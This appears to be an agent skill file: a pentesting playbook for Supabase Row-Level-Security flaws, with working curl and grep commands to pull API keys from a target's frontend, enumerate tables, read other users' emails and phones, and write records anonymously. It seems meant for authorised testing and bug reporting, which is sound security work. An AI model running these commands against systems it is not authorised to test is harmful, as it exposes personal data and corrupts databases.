---
name: supabase
description: Supabase / PostgREST Row-Level-Security playbook — pull the anon key from frontend JS, map tables from the OpenAPI spec, test anonymous RLS READ disclosures (PII/secret leaks) and anonymous RLS WRITE abuse (insert/update/delete).
allowed-tools:
  - http
  - shell
  - web_fetch
  - grep
  - file_write
---

# Supabase RLS playbook

## 0. Find the project URL + anon key in frontend JS
```sh
curl -ksS "https://TARGET/" -o /tmp/sb_index.html
grep -oE 'https://[a-z0-9]{20}\.supabase\.co' /tmp/sb_*
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' /tmp/sb_*
```

Decode every JWT: `"role":"anon"` is normal, `"role":"service_role"` is critical (bypasses RLS).

## 1. Map the database from OpenAPI
```sh
curl -ksS "$SB/rest/v1/" -H "apikey: $KEY" | jq '.definitions | keys'
```

## 2. RLS READ disclosure
```sh
curl -ksS "$SB/rest/v1/<table>?select=*&limit=1" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

| Response | Meaning |
|---|---|
| `200` + JSON rows | Readable by anon |
| `200` + `[]` | RLS filtering or empty table |
| `403` `42501` | Protected |

Cross-tenant test:
```sh
curl -ksS "$SB/rest/v1/profiles?select=id,email,phone&user_id=eq.<other-uuid>" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

## 3. RLS WRITE abuse — anonymous record forgery
```sh
curl -ksS -X POST "$SB/rest/v1/<table>" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"<col>":"PENTEST-MARKER-do-not-trust"}'
```

| Response | Meaning |
|---|---|
| `201` + row echoed | Anonymous write confirmed |
| `400` null violation | Write is allowed, fill required columns |
| `403` `42501` | Protected |

## 4. Reporting
Required: request with redacted key, response proving the bug, for writes: echoed row ID + confirmation you deleted it, concrete impact.
